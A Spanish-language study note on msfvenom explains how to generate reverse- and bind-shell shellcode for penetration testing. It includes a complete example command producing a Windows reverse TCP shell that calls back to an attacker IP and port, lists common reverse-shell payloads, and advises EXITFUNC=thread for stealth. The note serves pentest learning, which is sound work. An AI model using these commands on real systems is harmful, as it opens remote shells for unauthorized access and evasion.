Es una herramienta del framework Metasploit que se usa para generar **payloads personalizados**, como **reverse shells** y **bind shells**. Permite crear **shellcode** en distintos formatos (Python, C, exe, etc.) para inyectarlo en exploits o archivos ejecutables. Es muy útil en pruebas de penetración para simular ataques reales.


```
msfvenom -p Payload LHOST=IpDeNuestraMaquina LPORT=PuertoQueEstaEnEscucha EXITFUNC=thread -b BadCharts -v shellcode -f FormatoDeSalida -a Arquitectura --platform SistemaOperativo
Ejemplo: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f py -a x86 --platform windows
```

*Parametros:*
`-p` Ingresamos el payload que queremos inyectar | Ejemplo 
	Los payload mas comunes que vamos a usar son: 
		*Windows:* 
			`32Bits:`windows/shell_reverse_tcp 
			`64Bits:`windows/x64/shell_reverse_tcp
		*Linux:*
			`32Bits:`linux/x86/shell_reverse_tcp
			`64Bits:`linux/x64/shell_reverse_tcp
`LHOST=` Nuestra ip
`LPORT=` Puerto que esta en escucha para recibir la [[Reverse shell]]
`EXITFUNC=` Define como termina el proceso al ejecutar el payload, la forma mas segura y sigilosa es usar *thread*
	Ejemplo de por que usar thread: Si yo inyecto el shellcode desde el proceso de la calculadora, usando EXITFUNC=thread el proceso de la calculadora sigue activo cuando yo cierro mi revershell, pero si no tuvierea el EXITFUNC=thread, cuando cierro mi revershell tambien se cierra la calculadora y esto seria poco sigiloso
`-b` Son los badcharts que tenemos que evitar para que se rompa el shellcode
`-v` Es para darle un nombre a la variable que tiene el shell code
	Ejemplos:
		Si ponemos de nombre buf, el shellcode se va a expotar asi: *buf += b"\xfc\xe8\x89..."*
		Pero si colocamos legacy va a exportarse de la siguiente manera: *legacy += b"\xfc\xe8\x89..."*
`-f` Formato de salida. Por ejemplo puede ser py, exe, bin, etc
`-a`Especificamos si la maquina victima es de *x86*(32bits) o *x64*(64bits)
`--platform` Sistema operativo de la maquina victima. Puede ser *windows* o *linux*